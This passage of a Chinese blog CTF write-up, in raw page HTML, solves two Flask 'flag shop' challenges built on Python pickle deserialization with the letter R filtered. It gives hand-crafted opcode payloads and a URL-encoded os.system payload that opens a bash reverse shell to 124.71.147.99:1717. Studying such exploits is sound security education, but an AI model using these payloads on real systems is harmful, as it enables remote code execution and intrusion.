153, 153);">25</li><li style="color: rgb(153, 153, 153);">26</li><li style="color: rgb(153, 153, 153);">27</li><li style="color: rgb(153, 153, 153);">28</li><li style="color: rgb(153, 153, 153);">29</li><li style="color: rgb(153, 153, 153);">30</li><li style="color: rgb(153, 153, 153);">31</li><li style="color: rgb(153, 153, 153);">32</li><li style="color: rgb(153, 153, 153);">33</li><li style="color: rgb(153, 153, 153);">34</li><li style="color: rgb(153, 153, 153);">35</li><li style="color: rgb(153, 153, 153);">36</li><li style="color: rgb(153, 153, 153);">37</li><li style="color: rgb(153, 153, 153);">38</li><li style="color: rgb(153, 153, 153);">39</li><li style="color: rgb(153, 153, 153);">40</li><li style="color: rgb(153, 153, 153);">41</li><li style="color: rgb(153, 153, 153);">42</li><li style="color: rgb(153, 153, 153);">43</li><li style="color: rgb(153, 153, 153);">44</li><li style="color: rgb(153, 153, 153);">45</li><li style="color: rgb(153, 153, 153);">46</li><li style="color: rgb(153, 153, 153);">47</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:53,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>核心代码是这段：</p> 
<pre data-index="54" class="set-code-hide prettyprint"><code class="prism language-python has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'View code in /code to buy flag.'</span>
    <span class="token keyword">if</span> <span class="token string">'R'</span> <span class="token keyword">in</span> user<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'臭要饭的别挡我财路'</span>

    user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>user<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>name<span class="token punctuation">,</span> user<span class="token punctuation">.</span>money<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>buyInfo<span class="token punctuation">.</span>NAME<span class="token punctuation">,</span>  buyInfo<span class="token punctuation">.</span>MONEY<span class="token punctuation">)</span>
    <span class="token keyword">if</span> user <span class="token operator">==</span> Hi<span class="token punctuation">(</span>buyInfo<span class="token punctuation">.</span>NAME<span class="token punctuation">,</span>  buyInfo<span class="token punctuation">.</span>MONEY<span class="token punctuation">)</span><span class="token punctuation">:</span>
        buyInfo<span class="token punctuation">.</span>reset<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'CNSS娘最喜欢富哥啦，这是你要的flag </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>flag<span class="token punctuation">}</span></span><span class="token string">'</span></span>

    <span class="token keyword">return</span> <span class="token string">'臭要饭的别挡我财路'</span>
<div class="hljs-button {2} add_def" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:54,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><code>pickle.loads()</code>函数是漏洞点，pickle反序列化。其实有pickle反序列化直接弹shell就行，但是这里根着题目意思来。</p> 
<p><code>__eq__(self, other)</code>方法在Python中是一个特殊的方法，用于定义当使用等号运算符(<code>==</code>)比较两个类的实例时的行为。</p> 
<p>如果你在类中实现了<code>__eq__</code>方法，那么你就告诉Python，应该如何判断两个该类的实例是否相等。默认情况下，如果你没有定义<code>__eq__</code>，两个类的实例只有在它们是内存中同一个对象时（即具有相同的身份）才会被认为是相等的。但是，如果你想根据某些属性来判断两个实例是否相等，就需要定义<code>__eq__</code>方法。</p> 
<p>在<code>Hi</code>类中，<code>__eq__</code>方法的定义如下：</p> 
<pre data-index="55" class="set-code-show prettyprint"><code class="prism language-python has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> other<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token keyword">and</span> self<span class="token punctuation">.</span>money <span class="token operator">==</span> other<span class="token punctuation">.</span>money
<div class="hljs-button {2} mddef add_def" data-title="复制" data-report-click="{&quot;spm&quot;:&quot;3001.10243&quot;}"></div></code><ul class="pre-numbering" style="opacity: 0.172824;"><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li></ul>'<button class="btn-code-notes mdeditor btn_def" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:55,&quot;runIdx&quot;:1}}">代码解读</button><div class="code-edithtml active c-box-black" data-title="运行"><div data-report-view="{&quot;spm&quot;:&quot;3001.10182&quot;,&quot;extra&quot;:{&quot;index&quot;:1,&quot;ab&quot;:&quot;exp1&quot;}}" data-report-click="{&quot;spm&quot;:&quot;3001.10182&quot;,&quot;extra&quot;:{&quot;index&quot;:1,&quot;ab&quot;:&quot;exp1&quot;}}" class="code-edithtml-box code-edithtml-box1"><i></i>运行<div><button>运行</button></div></div></div></pre> 
<p>这个方法用于比较两个<code>Hi</code>类的实例（<code>self</code>和<code>other</code>）。它检查两个实例的<code>name</code>和<code>money</code>属性是否相等。如果它们都相等，则方法返回<code>True</code>，表示这两个实例是相等的。否则，返回<code>False</code>。</p> 
<p>举个例子：</p> 
<pre data-index="56" class="set-code-show prettyprint"><code class="prism language-python has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">person1 <span class="token operator">=</span> Hi<span class="token punctuation">(</span><span class="token string">"Alice"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>
person2 <span class="token operator">=</span> Hi<span class="token punctuation">(</span><span class="token string">"Alice"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>
person3 <span class="token operator">=</span> Hi<span class="token punctuation">(</span><span class="token string">"Bob"</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>person1 <span class="token operator">==</span> person2<span class="token punctuation">)</span>  <span class="token comment"># 这将打印True，因为name和money属性都相等</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>person1 <span class="token operator">==</span> person3<span class="token punctuation">)</span>  <span class="token comment"># 这将打印False，因为name或money属性不相等</span>
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:56,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>因此，<code>__eq__</code>方法实际上是实现用户在自定义比较<code>Hi</code>类的实例时，实现<code>==</code>运算符的含义。</p> 
<p>虽然这题和自助商店一样可以直接打RCE，但是我们还是做一下预期解。</p> 
<p>预期解是我们序列化一个对象即可，name、money和buyInfo对象的name、money相等就行，</p> 
<p>对象名字任意取，不用R。</p> 
<p>可以先看一个test脚本：</p> 
<pre data-index="57" class="set-code-hide prettyprint"><code class="prism language-python has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> os


<span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">18</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"Pickle"</span>

    <span class="token comment"># def __reduce__(self):</span>
    <span class="token comment">#     command = r"whoami"</span>
    <span class="token comment">#     return (os.system, (command,))</span>


p <span class="token operator">=</span> Person<span class="token punctuation">(</span><span class="token punctuation">)</span>
opcode <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>opcode<span class="token punctuation">)</span>

P <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>opcode<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The age is:'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>P<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'The name is:'</span> <span class="token operator">+</span> P<span class="token punctuation">.</span>name<span class="token punctuation">)</span>

<div class="hljs-button {2} mddef add_def" data-title="复制" data-report-click="{&quot;spm&quot;:&quot;3001.10243&quot;}"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png" alt="" title=""></span></div><ul class="pre-numbering" style="opacity: 0.172824;"><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li><li style="color: rgb(153, 153, 153);">20</li><li style="color: rgb(153, 153, 153);">21</li></ul>'<button class="btn-code-notes mdeditor btn_def" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:57,&quot;runIdx&quot;:2}}">代码解读</button><div class="code-edithtml active c-box-black" data-title="运行"><div data-report-view="{&quot;spm&quot;:&quot;3001.10182&quot;,&quot;extra&quot;:{&quot;index&quot;:2,&quot;ab&quot;:&quot;exp1&quot;}}" data-report-click="{&quot;spm&quot;:&quot;3001.10182&quot;,&quot;extra&quot;:{&quot;index&quot;:2,&quot;ab&quot;:&quot;exp1&quot;}}" class="code-edithtml-box code-edithtml-box2"><i></i>运行<div><button>运行</button></div></div></div></pre> 
<p><code>if 'R' in user.upper():</code>payload里面不能有<code>R</code>字符，之前有想过不给用R那名字里面的Rich怎么办，后来发现不一定要直接传值。还记得<code>c</code>指令码吗？它专门用来获取一个全局变量。</p> 
<p>看0x07：<a href="https://zhuanlan.zhihu.com/p/89132768" rel="nofollow">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p> 
<p>payload：</p> 
<pre data-index="58" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">(V\u0052\u0069\u0063\u0068%0aI2000%0ai__main__%0aHi%0a.

(i__main__%0AHi%0A(dS'money'%0AI2000%0AsS'name'%0AcbuyInfo%0ANAME%0Asb.

(i__main__%0AHi%0A(dS'money'%0AcbuyInfo%0AMONEY%0AsS'name'%0AcbuyInfo%0ANAME%0Asb.
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:58,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<h2><a name="t15"></a><a id="CNSSFlag_1562"></a>CNSS娘の自助Flag商店</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/d2755e029bdb83c6f513c8539daff268.png" alt="image-20240807205727858"></p> 
<p><code>/code</code>路由可以拿到源码</p> 
<pre data-index="59" class="set-code-show prettyprint"><code class="prism language-python has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">NAME <span class="token operator">=</span> <span class="token string">"Rich"</span>
MONEY <span class="token operator">=</span> <span class="token number">2000</span>

<span class="token keyword">def</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> NAME<span class="token punctuation">,</span> MONEY
    NAME <span class="token operator">=</span> <span class="token string">"Rich"</span>
    MONEY <span class="token operator">=</span> <span class="token number">2000</span>
<div class="hljs-button {2} mddef add_def" data-title="复制" data-report-click="{&quot;spm&quot;:&quot;3001.10243&quot;}"></div></code><ul class="pre-numbering" style="opacity: 0.172824;"><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li></ul>'<button class="btn-code-notes mdeditor btn_def" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:59,&quot;runIdx&quot;:3}}">代码解读</button><div class="code-edithtml active c-box-black" data-title="运行"><div data-report-view="{&quot;spm&quot;:&quot;3001.10182&quot;,&quot;extra&quot;:{&quot;index&quot;:3,&quot;ab&quot;:&quot;exp1&quot;}}" data-report-click="{&quot;spm&quot;:&quot;3001.10182&quot;,&quot;extra&quot;:{&quot;index&quot;:3,&quot;ab&quot;:&quot;exp1&quot;}}" class="code-edithtml-box code-edithtml-box3"><i></i>运行<div><button>运行</button></div></div></div></pre> 
<pre data-index="60" class="set-code-hide prettyprint"><code class="prism language-python has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token comment"># encoding: utf-8</span>
<span class="token keyword">import</span> pickle

<span class="token keyword">import</span> flask
<span class="token keyword">import</span> buyInfo

app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token comment"># flag is in /flag.txt</span>


<span class="token keyword">class</span> <span class="token class-name">Hi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> money<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>money <span class="token operator">=</span> money

    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> other<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token keyword">and</span> self<span class="token punctuation">.</span>money <span class="token operator">==</span> other<span class="token punctuation">.</span>money


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'View code in /code to buy flag.'</span>
    <span class="token keyword">if</span> <span class="token string">'R'</span> <span class="token keyword">in</span> user<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'臭要饭的别挡我财路'</span>

    user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>user<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> user <span class="token operator">==</span> Hi<span class="token punctuation">(</span>buyInfo<span class="token punctuation">.</span>NAME<span class="token punctuation">,</span> buyInfo<span class="token punctuation">.</span>MONEY<span class="token punctuation">)</span><span class="token punctuation">:</span>
        buyInfo<span class="token punctuation">.</span>reset<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token string">'你说得对，但是上次CNSS娘被你骗了之后很伤心，把商店改成了自助flag商店，你得自己找flag'</span>

    <span class="token keyword">return</span> <span class="token string">'臭要饭的别挡我财路'</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/code'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">'code.zip'</span>
    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/zip'</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span>
<div class="hljs-button {2} add_def" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li><li style="color: rgb(153, 153, 153);">20</li><li style="color: rgb(153, 153, 153);">21</li><li style="color: rgb(153, 153, 153);">22</li><li style="color: rgb(153, 153, 153);">23</li><li style="color: rgb(153, 153, 153);">24</li><li style="color: rgb(153, 153, 153);">25</li><li style="color: rgb(153, 153, 153);">26</li><li style="color: rgb(153, 153, 153);">27</li><li style="color: rgb(153, 153, 153);">28</li><li style="color: rgb(153, 153, 153);">29</li><li style="color: rgb(153, 153, 153);">30</li><li style="color: rgb(153, 153, 153);">31</li><li style="color: rgb(153, 153, 153);">32</li><li style="color: rgb(153, 153, 153);">33</li><li style="color: rgb(153, 153, 153);">34</li><li style="color: rgb(153, 153, 153);">35</li><li style="color: rgb(153, 153, 153);">36</li><li style="color: rgb(153, 153, 153);">37</li><li style="color: rgb(153, 153, 153);">38</li><li style="color: rgb(153, 153, 153);">39</li><li style="color: rgb(153, 153, 153);">40</li><li style="color: rgb(153, 153, 153);">41</li><li style="color: rgb(153, 153, 153);">42</li><li style="color: rgb(153, 153, 153);">43</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:60,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>pickle反序列化。<code>if 'R' in user.upper():</code>禁用了R字符。像[2021极客巅峰 opcode]，参考文章：<a href="https://blog.csdn.net/qq_39947980/article/details/137033740">CTF题型 Python中pickle反序列化进阶利用&amp;opcode绕过_ctf opcode-CSDN博客</a></p> 
<p>这个有R被ban了</p> 
<pre data-index="61" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">cos
system
(S'whoami'
tR.
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:61,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>下面两个都可以用</p> 
<pre data-index="62" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">(S'bash -c 'sh -i &gt;&amp; /dev/tcp/124.71.147.99/1717 0&gt;&amp;1''
ios
system
.
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:62,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<pre data-index="63" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">(cos
system
S'bash -c 'sh -i &gt;&amp; /dev/tcp/124.71.147.99/1717 0&gt;&amp;1''
o.
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:63,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>payload：（要URL编码一下）</p> 
<pre data-index="64" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">/?user=(S'bash%20-c%20'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F124.71.147.99%2F1717%200%3E%261''%0Aios%0Asystem%0A.
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:64,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/40dec4e0a606d45f68fea7ee9b6c73f5.png" alt="image-20240807211133061"></p>
                </div><div data-report-view="{&quot;mod&quot;:&quot;1585297308_001&quot;,&quot;spm&quot;:&quot;1001.2101.3001.6548&quot;,&quot;dest&quot;:&quot;https://jay17.blog.csdn.net/article/details/142147166&quot;,&quot;extend1&quot;:&quot;pc&quot;,&quot;ab&quot;:&quot;new&quot;}"><div></div></div>
                <link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-f23dff6052.css" rel="stylesheet">
                <link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-e504d6a974.css" rel="stylesheet">
        </div>
    </article>
  <script>
    $(function() {
      setTimeout(function () {
        var mathcodeList = document.querySelectorAll('.htmledit_views img.mathcode');
        if (mathcodeList.length > 0) {
          for (let i = 0; i < mathcodeList.length; i++) {
            if (mathcodeList[i].complete) {
              if (mathcodeList[i].naturalWidth === 0 || mathcodeList[i].naturalHeight === 0) {
                var alt = mathcodeList[i].alt;
                alt = '\\(' + alt + '\\)';
                var curSpan = $('<span class="img-codecogs"></span>');
                curSpan.text(alt);
                $(mathcodeList[i]).before(curSpan);
                $(mathcodeList[i]).remove();
              }
            } else {
              mathcodeList[i].onerror = function() {
                var alt = mathcodeList[i].alt;
                alt = '\\(' + alt + '\\)';
                var curSpan = $('<span class="img-codecogs"></span>');
                curSpan.text(alt);
                $(mathcodeList[i]).before(curSpan);
                $(mathcodeList[i]).remove();
              };
            }
          }
          MathJax.Hub.Queue(["Typeset",MathJax.Hub]);
        }
      }, 500)
    });
  </script>
</div>